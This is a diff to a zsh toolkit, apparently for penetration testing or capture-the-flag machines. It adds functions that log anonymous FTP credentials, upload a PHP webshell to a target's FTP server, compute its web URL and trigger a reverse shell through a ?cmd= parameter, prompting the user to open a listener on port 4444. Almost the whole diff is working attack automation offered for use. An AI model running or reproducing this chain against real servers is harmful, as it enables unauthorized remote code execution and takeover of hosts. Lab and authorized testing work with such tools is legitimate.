@@ -2,6 +2,20 @@
 # FTP client helpers
 # ========================
 
+_ftp-creds-save-anon() {
+  local ip="$1"
+  [[ -z "$ip" || -z "${RECON_APP:-}" ]] && return 0
+
+  local creds_status
+  creds_status="$(python3 "$RECON_APP" creds-add "$ip" "$FTP_ANON_USER" "$FTP_ANON_PASS" 2>&1)" || return 0
+
+  case "$creds_status" in
+    unchanged) echo "[=] creds: ${FTP_ANON_USER}@${ip}" >&2 ;;
+    updated)   echo "[~] creds: ${FTP_ANON_USER}@${ip}" >&2 ;;
+    *)         echo "[+] creds: ${FTP_ANON_USER}@${ip} (pass: ${FTP_ANON_PASS})" >&2 ;;
+  esac
+}
+
 _ftp-log-host() {
   local a
   for a in "$@"; do
@@ -203,6 +217,7 @@ ftpa() {
       -h|--help)
         echo "usage: ftpa [-l] [ip]"
         echo "  connect as anonymous@host (default host: \$IP)"
+        echo "  saves cl entry: anonymous / \$FTP_ANON_PASS (default: anonymous@)"
         echo "  -l  record to cases/<name>/logs/ (requires cs <name>, or CASE_LOOSE=1)"
         return 0
         ;;
@@ -219,6 +234,8 @@ ftpa() {
     return 1
   fi
 
+  _ftp-creds-save-anon "$target"
+
   if $log; then
     _ftp-run-logged anon "anonymous@${target}"
   else
@@ -233,3 +250,288 @@ _ftpa() {
 }
 
 compdef _ftpa ftpa
+
+# ========================
+# FTP upload + web ?cmd= reverse shell (paths per case / flags)
+# ========================
+#
+# Defaults (generic): ftp://IP/shell.php → http://IP/shell.php
+# Per-case: cases/<name>/ftp-shell  (see cases/startup/ftp-shell)
+# Override: -d -w -n -U  or env FTP_SHELL_*
+
+: "${FTP_SHELL_LOCAL:=/workspace/payloads/webshells/shell.php}"
+: "${FTP_SHELL_REMOTE_DIR:=}"
+: "${FTP_SHELL_REMOTE_NAME:=shell.php}"
+: "${FTP_SHELL_WEB_PREFIX:=}"
+
+_ftp-shell-case-file() {
+  [[ -n "${CASE_HOME:-}" ]] && echo "$CASE_HOME/ftp-shell"
+}
+
+# Load cases/<case>/ftp-shell (KEY=value) into FTP_SHELL_* when entering case
+_ftp-shell-load-case() {
+  local f line key val
+  f="$(_ftp-shell-case-file)"
+  [[ -f "$f" ]] || return 0
+
+  while IFS= read -r line || [[ -n "$line" ]]; do
+    [[ "$line" =~ '^[[:space:]]*#' || -z "${line//[[:space:]]/}" ]] && continue
+    [[ "$line" != *"="* ]] && continue
+    key="${line%%=*}"
+    val="${line#*=}"
+    key="${key//[[:space:]]/}"
+    val="${val#"${val%%[![:space:]]*}\"}"}"
+    val="${val%"${val##*[![:space:]]}\"}"}"
+    case "$key" in
+      LOCAL|FTP_SHELL_LOCAL) FTP_SHELL_LOCAL="$val" ;;
+      REMOTE_DIR|FTP_SHELL_REMOTE_DIR) FTP_SHELL_REMOTE_DIR="$val" ;;
+      REMOTE_NAME|FTP_SHELL_REMOTE_NAME) FTP_SHELL_REMOTE_NAME="$val" ;;
+      WEB_PREFIX|FTP_SHELL_WEB_PREFIX) FTP_SHELL_WEB_PREFIX="$val" ;;
+      SHELL_URL|FTP_SHELL_URL) FTP_SHELL_URL="$val" ;;
+    esac
+  done <"$f"
+}
+
+_ftp-shell-reset-case() {
+  unset FTP_SHELL_URL
+  FTP_SHELL_LOCAL="/workspace/payloads/webshells/shell.php"
+  FTP_SHELL_REMOTE_DIR=""
+  FTP_SHELL_REMOTE_NAME="shell.php"
+  FTP_SHELL_WEB_PREFIX=""
+  _ftp-shell-load-case
+}
+
+_ftp-anon-creds() {
+  local ip="$1"
+  local user="${FTP_ANON_USER}" pass="${FTP_ANON_PASS}"
+
+  if pass="$(_recon-creds-for-user "$ip" "$user" 2>/dev/null)"; then
+    echo "$user" "$pass"
+    return 0
+  fi
+  echo "$user" "$pass"
+}
+
+_ftp-put-file() {
+  local ip="$1" remote_path="$2" local_file="$3"
+  local user pass remote_dir remote_name
+
+  if [[ ! -f "$local_file" ]]; then
+    echo "[-] file not found: $local_file" >&2
+    return 1
+  fi
+
+  read -r user pass <<<"$(_ftp-anon-creds "$ip")"
+  remote_dir="${remote_path:h}"
+  remote_name="${remote_path:t}"
+
+  echo "[*] FTP put: ${local_file} → ftp://${ip}/${remote_path}" >&2
+  if curl -sS --user "${user}:${pass}" -T "$local_file" "ftp://${ip}/${remote_path}"; then
+    return 0
+  fi
+
+  echo "[!] curl FTP failed — trying ftp(1)..." >&2
+  ftp -n <<EOF
+open ${ip}
+user ${user} ${pass}
+binary
+$([[ -n "$remote_dir" && "$remote_dir" != "." ]] && print -r "cd ${remote_dir}")
+put ${local_file} ${remote_name}
+bye
+EOF
+}
+
+_ftp-shell-remote-path() {
+  local name="${1:-$FTP_SHELL_REMOTE_NAME}"
+  if [[ -n "$FTP_SHELL_REMOTE_DIR" ]]; then
+    echo "${FTP_SHELL_REMOTE_DIR}/${name}"
+  else
+    echo "$name"
+  fi
+}
+
+_ftp-shell-url() {
+  local ip="$1" name="${2:-$FTP_SHELL_REMOTE_NAME}"
+
+  if [[ -n "${FTP_SHELL_URL:-}" ]]; then
+    echo "$FTP_SHELL_URL"
+    return 0
+  fi
+
+  local prefix="${FTP_SHELL_WEB_PREFIX}" rel
+  rel="$(_ftp-shell-remote-path "$name")"
+  if [[ -n "$prefix" ]]; then
+    [[ "$prefix" != /* ]] && prefix="/$prefix"
+    prefix="${prefix%/}"
+    echo "http://${ip}${prefix}/${rel}"
+  else
+    echo "http://${ip}/${rel}"
+  fi
+}
+
+_ftp-shell-help() {
+  echo "usage: $1 [options] [port] [ip]"
+  echo "  FTP put → http://\$IP<WEB_PREFIX>/<REMOTE_DIR>/shell.php → ?cmd= revshell"
+  echo ""
+  echo "options:"
+  echo "  -d <dir>     FTP subdir on server (only if that folder exists; default: root)"
+  echo "  -w <prefix>  HTTP prefix before remote path (e.g. /files + dir=uploads → /files/uploads/shell.php)"
+  echo "  -U <url>     full shell URL (skip path math; for -u trigger)"
+  echo "  -n <name>    remote filename (default: shell.php)"
+  echo "  -p <path>    local payload file"
+  echo "  -P <port>    revshell port (ftprsh only, default: 4444)"
+  echo "  -u           skip upload (ftprsh only)"
+  echo ""
+  echo "per-case: cases/<name>/ftp-shell   session: export FTP_SHELL_*"
+  echo "defaults: ftp://\$IP/shell.php  →  http://\$IP/shell.php"
+}
+
+# upload shell to FTP
+ftp-put-shell() {
+  _ftp-shell-reset-case
+
+  local ip="" local_file="$FTP_SHELL_LOCAL"
+  local remote_name="$FTP_SHELL_REMOTE_NAME" remote_dir="$FTP_SHELL_REMOTE_DIR"
+  local web_prefix="$FTP_SHELL_WEB_PREFIX"
+
+  while [[ $# -gt 0 ]]; do
+    case "$1" in
+      -h|--help)
+        _ftp-shell-help "ftp-put-shell"
+        return 0
+        ;;
+      -p)
+        local_file="$2"
+        shift 2
+        ;;
+      -n)
+        remote_name="$2"
+        shift 2
+        ;;
+      -d)
+        remote_dir="$2"
+        shift 2
+        ;;
+      -w)
+        web_prefix="$2"
+        shift 2
+        ;;
+      -U)
+        FTP_SHELL_URL="$2"
+        shift 2
+        ;;
+      *)
+        ip="$1"
+        shift
+        ;;
+    esac
+  done
+
+  ip="${ip:-${IP:-}}"
+  if [[ -z "$ip" ]]; then
+    echo "usage: ftp-put-shell [options] [ip]  (or: ts <ip> first)" >&2
+    return 1
+  fi
+
+  FTP_SHELL_REMOTE_DIR="$remote_dir"
+  FTP_SHELL_REMOTE_NAME="$remote_name"
+  FTP_SHELL_WEB_PREFIX="$web_prefix"
+
+  local remote_path url
+  remote_path="$(_ftp-shell-remote-path "$remote_name")"
+  url="$(_ftp-shell-url "$ip" "$remote_name")"
+
+  echo "[*] put:  ftp://${ip}/${remote_path}" >&2
+  echo "[*] web:  ${url}" >&2
+
+  _ftp-creds-save-anon "$ip"
+  _ftp-put-file "$ip" "$remote_path" "$local_file" || return 1
+
+  echo "[+] done"
+  echo "[i] test: shell-cmd $url id"
+}
+
+# upload (optional) + trigger reverse shell via ?cmd=
+ftp-revshell() {
+  local port="4444" ip="" skip_upload=false
+  local -a put_opts=()
+
+  while [[ $# -gt 0 ]]; do
+    case "$1" in
+      -h|--help)
+        _ftp-shell-help "ftp-revshell (ftprsh)"
+        echo "  prep: listen [port] in another terminal"
+        return 0
+        ;;
+      -u|--no-upload)
+        skip_upload=true
+        shift
+        ;;
+      -P)
+        port="$2"
+        shift 2
+        ;;
+      -d|-w|-n|-p|-U)
+        put_opts+=("$1" "$2")
+        shift 2
+        ;;
+      *)
+        if [[ "$1" =~ $(_recon-ip-re) ]]; then
+          ip="$1"
+        elif [[ "$1" =~ '^[0-9]+$' ]]; then
+          port="$1"
+        fi
+        shift
+        ;;
+    esac
+  done
+
+  ip="${ip:-${IP:-}}"
+  if [[ -z "$ip" ]]; then
+    echo "usage: ftprsh [options] [port] [ip]" >&2
+    return 1
+  fi
+
+  local url
+  if ! $skip_upload; then
+    put_opts+=("$ip")
+    ftp-put-shell "${put_opts[@]}" || return 1
+    url="$(_ftp-shell-url "$ip")"
+  else
+    _ftp-shell-reset-case
+    while (( ${#put_opts[@]} >= 2 )); do
+      case "$put_opts[1]" in
+        -d) FTP_SHELL_REMOTE_DIR="$put_opts[2]" ;;
+        -w) FTP_SHELL_WEB_PREFIX="$put_opts[2]" ;;
+        -n) FTP_SHELL_REMOTE_NAME="$put_opts[2]" ;;
+        -p) FTP_SHELL_LOCAL="$put_opts[2]" ;;
+        -U) FTP_SHELL_URL="$put_opts[2]" ;;
+      esac
+      put_opts=("${put_opts[@]:3}")
+    done
+    url="$(_ftp-shell-url "$ip")"
+    echo "[*] skip upload (-u)" >&2
+    echo "[+] web: $url" >&2
+  fi
+
+  echo "========================"
+  echo "[FTP RSH] $ip → $url"
+  echo "[!] other terminal: listen $port"
+  echo "========================"
+
+  _rcecurl-trigger "$url" "$port"
+}
+
+alias ftprsh='ftp-revshell'
+
+_ftprsh() {
+  _arguments \
+    '-u[skip upload]' \
+    '-P[listener port]:port:' \
+    '-d[remote dir]:directory:' \
+    '-w[web prefix]:prefix:' \
+    '1:port:(4444 5555)' \
+    '2:ip:($IP)'
+}
+
+compdef _ftprsh ftp-revshell ftprsh
